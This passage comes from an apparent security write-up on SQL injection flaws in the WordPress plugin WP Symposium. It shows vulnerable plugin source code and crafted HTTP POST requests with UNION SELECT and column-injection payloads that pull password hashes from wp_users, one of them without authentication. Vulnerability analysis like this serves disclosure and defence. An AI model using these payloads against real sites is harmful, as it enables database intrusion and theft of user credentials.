					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a549148973825-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a549148973825-2">2</div><div class="crayon-num" data-line="crayon-53c987785a549148973825-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a549148973825-4">4</div><div class="crayon-num" data-line="crayon-53c987785a549148973825-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a549148973825-6">6</div><div class="crayon-num" data-line="crayon-53c987785a549148973825-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a549148973825-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a549148973825-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_groups_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a549148973825-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987785a549148973825-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a549148973825-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987785a549148973825-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a549148973825-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">130</span></div><div class="crayon-line" id="crayon-53c987785a549148973825-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a549148973825-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">get_user_list</span><span class="crayon-o">&amp;</span><span class="crayon-v">gid</span><span class="crayon-o">=</span><span class="crayon-cn">353234</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-i">user_pass</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">display_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-h"> </span><span class="crayon-e">FROM </span><span class="crayon-e">wp_users </span><span class="crayon-i">WHERE</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0053 seconds] -->
<p><strong>Analysis of get_album_item.php SQL injection vulnerability</strong></p>
<p>This SQL injection vulnerability is practically as simple as it gets. And it even makes it simple for us in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/get_album_item.php">get_album_item.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a551363001214" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php
	include_once('../../../wp-config.php');
	global $wpdb;
	$iid = $_REQUEST['iid'];
	$size = $_REQUEST['size'];
	$sql = "SELECT ".$size." FROM ".$wpdb-&gt;base_prefix."symposium_gallery_items WHERE iid = %d";
	$image = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $iid));	
	header("Content-type: image/jpeg");
	echo stripslashes($image);
?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a551363001214-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a551363001214-2">2</div><div class="crayon-num" data-line="crayon-53c987785a551363001214-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a551363001214-4">4</div><div class="crayon-num" data-line="crayon-53c987785a551363001214-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a551363001214-6">6</div><div class="crayon-num" data-line="crayon-53c987785a551363001214-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a551363001214-8">8</div><div class="crayon-num" data-line="crayon-53c987785a551363001214-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a551363001214-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a551363001214-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a551363001214-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">include_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../wp-config.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a551363001214-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a551363001214-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$iid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'iid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a551363001214-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$size</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'size'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a551363001214-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT "</span><span class="crayon-sy">.</span><span class="crayon-v">$size</span><span class="crayon-sy">.</span><span class="crayon-s">" FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_gallery_items WHERE iid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a551363001214-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$image</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$iid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a551363001214-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: image/jpeg"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a551363001214-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-v">$image</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a551363001214-10"><span class="crayon-ta">?&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0041 seconds] -->
<p>It reads in 2 variables from $_REQUEST, which can be either GET or POST parameters. That&#8217;s very handy. It then proceeds to stuff the size into the SELECT part of the query using plain concatenation without previous sanitization, and then uses the wordpress prepare method of passing in content to a query safely using a printf syntax, which is safe.</p>
<p>Because we have control over the SELECT part of the query, we can easily select out a single piece of data at a time, which is sufficient to dump the whole database as needed. Here we can pull out a password from the users table, for instance, using a very simple request, no authenticationrequired:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a558214645869" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/get_album_item.php HTTP/1.0
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

size=user_pass FROM wp_users #</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a558214645869-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a558214645869-2">2</div><div class="crayon-num" data-line="crayon-53c987785a558214645869-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a558214645869-4">4</div><div class="crayon-num" data-line="crayon-53c987785a558214645869-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a558214645869-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a558214645869-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-v">get_album_item</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a558214645869-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987785a558214645869-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a558214645869-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line" id="crayon-53c987785a558214645869-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a558214645869-6"><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-e">user_pass </span><span class="crayon-e">FROM </span><span class="crayon-i">wp_users</span><span class="crayon-h"> </span><span class="crayon-p">#</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0022 seconds] -->
<p><strong>Analysis of symposium_show_profile SQL injection vulnerability</strong></p>
<p>This vulnerability relies on the way which profiles are shown in Symposium. It calls into the symposium_show_profile method in symposium_profile.php file, which finds out what ID to show information for like this, assuming you are authenticated:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a55e715613249" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Adds profile page
function symposium_show_profile($page)  
{  

	global $wpdb, $current_user;

	$uid = '';

	if (isset($_POST['from']) &amp;amp;&amp;amp; $_POST['from'] == 'small_search') {
		if ($_POST['uid'] == '') {
			$search = $_POST['member_small'];
			$uid = $wpdb-&amp;gt;get_var("SELECT u.ID FROM ".$wpdb-&amp;gt;base_prefix."users u WHERE u.display_name LIKE '".$search."%'");
		}
	} 
	if ($uid == '') {

		if (isset($_GET['uid'])) {
			$uid = $_GET['uid'];
		} else {
			if (isset($_POST['uid'])) {
				$uid = $_POST['uid'];
			} else {
				$uid = $current_user-&amp;gt;ID;
			}
		}

	}

	// resolve stubs if using WPS permalinks
	if ( get_option('symposium_permalink_structure') &amp;amp;&amp;amp; get_query_var('stub')) {
		$stubs = explode('/', get_query_var('stub'));
		$stub0 = $stubs[0];
		if (WPS_DEBUG) echo $stub0.'&amp;lt;br /&amp;gt;';

		if ($stub0) {
			$sql = "SELECT ID FROM ".$wpdb-&amp;gt;base_prefix."users WHERE replace(display_name, ' ', '') = %s";
			$id = $wpdb-&amp;gt;get_var($wpdb-&amp;gt;prepare($sql, $stub0));
			if (WPS_DEBUG) echo $wpdb-&amp;gt;last_query.'&amp;lt;br /&amp;gt;';
			if ($id) {
				$uid = $id;
			}
		}
	}

	$share = get_symposium_meta($uid, 'share');
	if (WPS_DEBUG) echo 'UID:'.$uid.'&amp;lt;br /&amp;gt;';
	$html = '&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'.$uid.'&amp;lt;/div&amp;gt;';

	if (is_user_logged_in() || $share == 'public') {		

		$user = $wpdb-&amp;gt;get_row("SELECT display_name FROM ".$wpdb-&amp;gt;base_prefix."users WHERE ID = ".$uid);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a55e715613249-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-2">2</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-4">4</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-6">6</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-8">8</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-10">10</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-12">12</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-14">14</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-16">16</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-18">18</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-20">20</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-22">22</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-24">24</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-26">26</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-28">28</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-30">30</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-32">32</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-34">34</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-36">36</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-38">38</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-40">40</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-42">42</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-44">44</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-46">46</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-48">48</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a55e715613249-50">50</div><div class="crayon-num" data-line="crayon-53c987785a55e715613249-51">51</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a55e715613249-1"><span class="crayon-c">// Adds profile page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_show_profile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">page</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-3"><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-4">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-6">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-8">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a55e715613249-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'small_search'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'member_small'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a55e715613249-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT u.ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u WHERE u.display_name LIKE '"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-sy">.</span><span class="crayon-s">"%'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a55e715613249-13"><span 